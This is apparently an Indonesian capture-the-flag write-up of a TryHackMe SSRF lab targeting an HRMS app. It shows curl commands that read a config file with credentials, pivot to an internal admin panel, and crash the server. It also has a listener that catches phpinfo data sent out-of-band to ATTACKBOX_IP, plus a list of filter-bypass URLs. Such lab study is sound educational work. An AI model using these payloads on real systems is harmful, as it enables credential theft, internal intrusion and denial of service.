# TryHackMe — SSRF

> Room: https://tryhackme.com/room/ssrfhr
> Difficulty: Medium — Target: `http://hrms.thm` (Human Resource Management System)

Writeup ini ngikutin struktur task asli room-nya. Target vulnerable-nya adalah aplikasi HRMS, bukan aplikasi "Acme IT Support" generik — kalau kamu nemu writeup lain yang nyebut Acme, itu room yang beda (Intro to SSRF, bukan ini).

Nilai seperti kredensial login, `flag`, dan output `phpinfo()` itu **di-generate unik per instance machine**, jadi nggak saya tulis sebagai angka pasti — saya kasih command/step persis buat kamu ekstrak sendiri pas ngerjain labnya.

---

## Setup

```bash
# tambahkan hostname ke /etc/hosts (Linux) atau C:\Windows\System32\drivers\etc\hosts (Windows)
echo "MACHINE_IP hrms.thm" | sudo tee -a /etc/hosts

curl -I http://hrms.thm
```

---

## Task 1 — Introduction

Cuma verifikasi akses ke `http://hrms.thm`. Pastikan hostname sudah ke-mapping dan machine sudah fully booted (tunggu 2–3 menit).

---

## Task 2 — Anatomy of SSRF Attack

Konsep: SSRF muncul ketika **input user dipakai untuk membentuk request** (biasanya URL) tanpa validasi memadai, sehingga attacker bisa mengarahkan request server ke tujuan yang mereka kontrol.

SSRF masuk OWASP Top 10 (A10:2021). Statistik OWASP untuk SSRF (sesuai tabel di room):

| Metric | Value |
|---|---|
| Max Incidence Rate | 2.72% |
| Avg Incidence Rate | 2.72% |
| Avg Weighted Exploit | 8.28 |
| **Avg Weighted Impact** | **6.72** |
| Max Coverage | 67.2% |
| Total Occurrences | 9503 |
| Total CVEs | 385 |

**Jawaban:** Avg Weighted Impact → `6.72`

Tiga risiko utama SSRF yang dibahas: **Data Exposure**, **Reconnaissance** (port scanning internal network), dan **Denial of Service**.

---

## Task 3 — Types of SSRF: Basic (Scenario I — Local Server)

### Temuan awal

Akses `http://hrms.thm` otomatis redirect ke:
```
http://hrms.thm/?url=localhost/copyright
```

Parameter `url` ini yang jadi celah. Source vulnerable-nya:

```php
$uri = rtrim($_GET['url'], "/");
...
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
    echo "<pre>";
    echo htmlspecialchars(file_get_contents($path));
    echo "</pre>";
} else {
    echo "not found";
}
```

Parameter `url` langsung dipakai untuk resolve path file di server **tanpa whitelist/sanitasi** — ini local file disclosure lewat SSRF-style parameter.

### PoC — Enumerasi file lewat parameter `url`

```bash
# baca file yang legit disediakan aplikasi
curl "http://hrms.thm/?url=localhost/copyright"

# coba file yang nggak ada -> muncul error "not found", konfirmasi behavior
curl "http://hrms.thm/?url=localhost/hello"

# target file sensitif -> config biasanya nyimpen kredensial
curl "http://hrms.thm/?url=localhost/config"
```

Kalau berhasil, bagian footer response akan menampilkan isi `config.php`, biasanya berisi:

```php
<?php
$adminURL = "...";   // URL panel admin internal
$username = "...";   // kredensial login HRMS
$password = "...";
?>
```

### Yang perlu kamu lakukan sendiri di lab

1. Jalankan `curl "http://hrms.thm/?url=localhost/config"` dan baca isi footer response.
2. Catat `$username`, `$password`, dan `$adminURL`.
3. Login ke `http://hrms.thm` pakai kredensial itu.
4. Flag biasanya muncul di dashboard setelah login — unik per instance, catat dari sana.

**Pertanyaan task ini (jawaban didapat dari langkah di atas, bukan nilai statis):**
- Username login HRMS?
- Password login HRMS?
- Admin URL sesuai config file?
- Flag setelah berhasil login?

---

## Task 4 — Types of SSRF: Basic (Scenario II — Internal Server)

Setelah login, dashboard menampilkan dropdown data karyawan/gaji yang isinya di-fetch dari **internal IP** (`192.168.2.10`) — non-routable dari luar, tapi server HRMS bisa akses karena satu jaringan.

Observasi dari HTML source: dropdown gaji memanggil:
```
http://192.168.2.10/salary.php
```

Sementara admin panel yang tidak bisa diakses langsung dari luar ada di:
```
http://192.168.2.10/admin.php
```

### PoC — Pivot ke internal admin panel via parameter yang sama

1. Buka DevTools (Inspect Element) di dropdown "Select Category".
2. Ubah value option `Salary` dari:
   ```html
   <option value="http://192.168.2.10/salary.php">Salary</option>
   ```
   jadi:
   ```html
   <option value="http://192.168.2.10/admin.php">Salary</option>
   ```
3. Pilih ulang opsi "Salary" di dropdown — server HRMS (yang punya akses jaringan ke `192.168.2.10`) akan fetch `admin.php` atas nama kamu dan menampilkan isinya.

Ini contoh klasik **SSRF untuk mem-bypass network segmentation**: attacker nggak punya rute langsung ke IP privat, tapi server korban punya, dan parameter yang nggak divalidasi dipakai sebagai proxy.

**Jawaban:**
- Bisa akses non-routable address lewat SSRF? → `yea`
- Flag setelah akses admin panel → dapat dari isi halaman `admin.php` yang berhasil di-load (unik per instance)

---

## Task 5 — Types of SSRF: Blind

### Out-of-Band SSRF

Tab `Profile` me-redirect ke:
```
http://hrms.thm/profile.php?url=localhost/getInfo.php
```

Source `profile.php`:

```php
<?php
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
?>
```

Server mengirim **output `phpinfo()` lewat POST** ke URL yang dikontrol lewat parameter `url` — tanpa validasi. Response dari request ini tidak ditampilkan ke attacker (makanya "blind"), tapi kita bisa pakai teknik **out-of-band**: arahkan ke server kita sendiri dan tangkap datanya di sana.

### PoC — Listener untuk menangkap data out-of-band

Buat `server.py` di AttackBox:

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        self.send_response(200)
        self.end_headers()
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

Jalankan:

```bash
sudo chmod +x server.py && sudo python3 server.py
```

Lalu trigger SSRF-nya dari browser (atau curl):

```bash
curl "http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080"
```

Server HRMS akan mengirim POST request berisi output `phpinfo()` ke listener kamu, tersimpan di `data.html`. Baca file itu:

```bash
cat data.html
```

Di situ bakal ada info seperti `Virtual Directory Support`, `PHP Extension Build`, versi PHP, loaded modules, config path, dll — semua ini data recon berharga buat tahap exploitation selanjutnya (misal php.ini path, disable_functions, dsb).

### Semi-Blind SSRF (Time-based)

Teknik lain: ukur response time. Kalau request ke suatu host/port butuh waktu signifikan lebih lama (karena port kebuka dan nunggu koneksi) dibanding host/port yang closed/unreachable (biasanya instant refused), itu indikasi SSRF berhasil connect meski kamu nggak lihat response-nya langsung. Berguna buat internal port scanning secara blind.

**Jawaban:**
- Out-of-band SSRF selalu dapat direct response? → `nay`
- `Virtual Directory Support` & `PHP Extension Build` → baca dari `data.html` hasil capture kamu sendiri
- Jenis SSRF yang nggak kasih direct response/feedback → `Blind`

---

## Task 6 — Classic Example: Crashing the Server (DoS via SSRF)

Tab `Training` memanggil:
```
http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg
```

Parameter `id` ternyata bisa diarahkan ke host arbitrary:

```bash
curl "http://hrms.thm/url.php?id=10.10.10.10"
```

Source `url.php` (potongan relevan):

```php
if ($imageSize < 100) {
    $base64Image = downloadAndEncodeImage($imageUrl);
    echo '<img src="' . htmlspecialchars($base64Image) . '" ...>';
} else {
    // Memory Outage - server will crash
}
```

Server men-download gambar dari URL yang dikontrol attacker, lalu encode ke base64 untuk ditampilkan. Kalau ukuran gambar **melebihi 100KB**, kode masuk ke branch yang menyebabkan memory outage.

### PoC — Trigger DoS

```bash
curl "http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg"
```

Ini adalah **SSRF yang dipakai sebagai vektor DoS**, bukan buat baca data — attacker memaksa server fetch resource besar/mahal melalui parameter yang tidak divalidasi, menghabiskan memory/resource server korban. Referensi kasus nyata: WordPress core blind SSRF dan CairoSVG advisory (keduanya dicontohkan di materi room).

**Jawaban:** Flag muncul di halaman setelah server crash karena load image >100KB — unik per instance.

---

## Task 7 — Remedial Measures

Mitigasi yang direkomendasikan:

1. **Strict input validation** — sanitasi semua input yang dipakai membentuk URL/request.
2. **Allowlist, bukan denylist/blocklist** — jauh lebih sulit di-bypass dibanding mencoba memblokir pattern berbahaya satu-satu.
3. **Network segmentation** — isolasi resource internal sensitif dari akses eksternal.
4. **Security headers** (misal `Content-Security-Policy`) — batasi aplikasi memuat resource eksternal.
5. **Strong access control** di layer internal — supaya request yang berhasil tembus pun tetap kena otorisasi.
6. **Logging & monitoring** — deteksi pola request yang mencurigakan.

**Jawaban:**
- Pendekatan yang disarankan untuk trusted URLs → `b) Maintaining an allowlist of trusted URLs`
- Apakah sanitasi input URL/parameter itu opsional? → `nay`

---

## Task 8 — Conclusion

Room ini nutup dengan rangkuman tiga tipe SSRF yang udah dipraktikkan:

| Tipe | Karakteristik | Contoh di room ini |
|---|---|---|
| **Basic (Local)** | Response langsung terlihat, target localhost server itu sendiri | `?url=localhost/config` |
| **Basic (Internal)** | Response langsung terlihat, target internal network lain | pivot ke `192.168.2.10/admin.php` |
| **Blind (Out-of-Band)** | Request terjadi tapi response tidak terlihat, dibuktikan via listener eksternal | `profile.php?url=` ke attacker listener |
| **Semi-Blind (Time-based)** | Diinfer dari response time, tanpa data langsung maupun OOB | Training/konsep response delay |

---

## Ringkasan Teknik Bypass yang Relevan (Tambahan di Luar Materi Room)

Kalau kamu nemu validasi yang lebih ketat dari yang dipakai HRMS di sini, teknik berikut umum dipakai untuk bypass deny list/allow list naif:

```
http://2130706433/              # 127.0.0.1 dalam decimal
http://0x7f000001/              # 127.0.0.1 dalam hex
http://127.1/                   # short form
http://[::1]/                   # IPv6 loopback
https://trusted.thm@attacker.com/   # URL parser confusion (userinfo)
https://trusted.thm.attacker.com/   # subdomain confusion
```

---

*Writeup ini dibuat untuk tujuan edukasi berdasarkan room [SSRF](https://tryhackme.com/room/ssrfhr) di TryHackMe. Nilai kredensial, flag, dan output phpinfo bersifat unik per deployment instance — ambil langsung dari lab kamu sendiri.*
